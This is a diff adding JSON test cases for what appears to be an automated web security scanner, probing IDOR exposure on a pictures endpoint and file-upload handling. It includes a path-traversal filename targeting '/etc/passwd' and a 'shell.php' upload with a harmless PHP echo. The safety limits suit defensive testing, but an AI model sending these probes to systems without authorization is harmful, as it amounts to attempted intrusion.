+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 50
+      },
+      "max_retries": 2,
+      "delay_between_requests": 1.0,
+      "notes": "Do not download or store image binary content beyond metadata size; only compare JSON listings",
+      "tags": [
+        "sensitive_data_exposure",
+        "idor"
+      ],
+      "estimated_duration": 300
+    },
+    {
+      "id": "TC-H-013",
+      "hypothesis_id": "H-013",
+      "base_url": "http://{{host}}",
+      "method": "GET",
+      "endpoint": "/pictures/",
+      "parameter": "",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [],
+          "description": "Baseline GET /pictures/ with authenticated token if endpoint is personal, or anonymous baseline if public",
+          "content_type": "application/json; charset=utf-8",
+          "header": []
+        },
+        {
+          "tier": "probe",
+          "payloads": [],
+          "description": "If endpoint should be restricted, test with non-owner token to compare result sizes",
+          "content_type": "application/json; charset=utf-8",
+          "header": []
+        },
+        {
+          "tier": "exploit",
+          "payloads": [],
+          "description": "No destructive actions; only single comparison to detect exposure of other users' pictures",
+          "content_type": "application/json; charset=utf-8",
+          "header": []
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "login",
+          "description": "Obtain authenticated tokens for two controlled accounts if endpoint is personal",
+          "extract_from": "/login POST response headers or body",
+          "bind_to": "header:Cookie and header:Cookie:other_user_session"
+        },
+        {
+          "type": "csrf_token",
+          "description": "Not required for GET"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "response_length_diff",
+          "condition": "If non-owner response returns >=40% larger payload or additional entries compared to baseline, flag potential exposure",
+          "threshold": {
+            "body_length_delta_pct": 40.0
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "status_code_change",
+          "condition": "If non-owner GET returns 200 where expected 401/403, flag authorization issue",
+          "threshold": {
+            "expected_codes": [
+              200,
+              401,
+              403
+            ]
+          },
+          "weight": 0.9
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 50
+      },
+      "max_retries": 2,
+      "delay_between_requests": 1.0,
+      "notes": "Only compare metadata; avoid fetching image binaries beyond headers",
+      "tags": [
+        "sensitive_data_exposure"
+      ],
+      "estimated_duration": 300
+    },
+    {
+      "id": "TC-H-014",
+      "hypothesis_id": "H-014",
+      "base_url": "http://{{host}}",
+      "method": "POST",
+      "endpoint": "/upload_photo/",
+      "parameter": "file",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [
+            {
+              "location": "body",
+              "value": "--BOUNDARY\r\nContent-Disposition: form-data; name=\"file\"; filename=\"photo.jpg\"\r\nContent-Type: image/jpeg\r\n\r\nJPEGDUMMYDATA\r\n--BOUNDARY--\r\n"
+            }
+          ],
+          "description": "Baseline valid multipart/form-data file upload body with placeholder JPEG data; replace BOUNDARY with actual boundary in request",
+          "encoding": "multipart/form-data; boundary=BOUNDARY",
+          "content_type": "multipart/form-data; boundary=BOUNDARY",
+          "header": [
+            {
+              "header_name": "Content-Type",
+              "header_value": "multipart/form-data; boundary=BOUNDARY"
+            }
+          ]
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "body",
+              "value": "--BOUNDARY\r\nContent-Disposition: form-data; name=\"file\"; filename=\"../../etc/passwd\"\r\nContent-Type: application/octet-stream\r\n\r\nDUMMY\r\n--BOUNDARY--\r\n"
+            }
+          ],
+          "description": "Probe filename path traversal in multipart filename field to elicit file-handling errors (no attempt to read server files)",
+          "encoding": "multipart/form-data; boundary=BOUNDARY",
+          "content_type": "multipart/form-data; boundary=BOUNDARY",
+          "header": [
+            {
+              "header_name": "Content-Type",
+              "header_value": "multipart/form-data; boundary=BOUNDARY"
+            }
+          ]
+        },
+        {
+          "tier": "exploit",
+          "payloads": [
+            {
+              "location": "body",
+              "value": "--BOUNDARY\r\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\nContent-Type: application/php\r\n\r\n<?php echo 'probe'; ?>\r\n--BOUNDARY--\r\n"
+            }
+          ],
+          "description": "Exploit-tier safe server-side inclusion probe using harmless php snippet in filename/body to detect upload handling and potential execution. Only execute if scope allows and monitored; otherwise treat as indicator",
+          "encoding": "multipart/form-data; boundary=BOUNDARY",
+          "content_type": "multipart/form-data; boundary=BOUNDARY",
+          "header": [
+            {
+              "header_name": "Content-Type",
+              "header_value": "multipart/form-data; boundary=BOUNDARY"
+            }
+          ]
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "login",
+          "description": "Authenticated_user_token_required — obtain session via POST /login and bind to Cookie or Authorization header for upload",
+          "extract_from": "/login POST response headers or body",
+          "bind_to": "header:Cookie or header:Authorization"
+        },
+        {
+          "type": "csrf_token",
+          "description": "Endpoint requires CSRF; fetch token from a relevant page and include as header X-CSRF-Token or form field",
+          "extract_from": "/upload_photo/ GET or related page",
+          "bind_to": "header:X-CSRF-Token or body:csrf_token"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "error_signature",
+          "condition": "Inspect responses for file-handling error messages, path traversal traces, stack traces, or inclusion errors not present in baseline; flag on any match",
+          "threshold": {},
+          "weight": 1.0
+        },
+        {
+          "signal": "status_code_change",
+          "condition": "If probe/exploit responses return unexpected codes (200,201,400,500) differing from baseline or body length delta >=30%, flag possible vulnerability",
+          "threshold": {
+            "body_length_delta_pct": 30.0,
+            "expected_codes": [
+              200,
+              201,
+              400,
+              500
+            ]
+          },
+          "weight": 0.9
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": false,
+        "destructive_ok": false,
+        "max_requests": 10
+      },
+      "max_retries": 1,
+      "delay_between_requests": 2.0,
+      "notes": "When constructing multipart bodies, replace BOUNDARY with actual boundary string. Do not attempt to upload real webshells in production; use non-executable payloads and only metadata probes. Stop if server indicates file executed.",
+      "tags": [
+        "file_upload",
+        "path_traversal",
+        "inclusion"
+      ],
+      "estimated_duration": 180
+    }
+  ]
+}
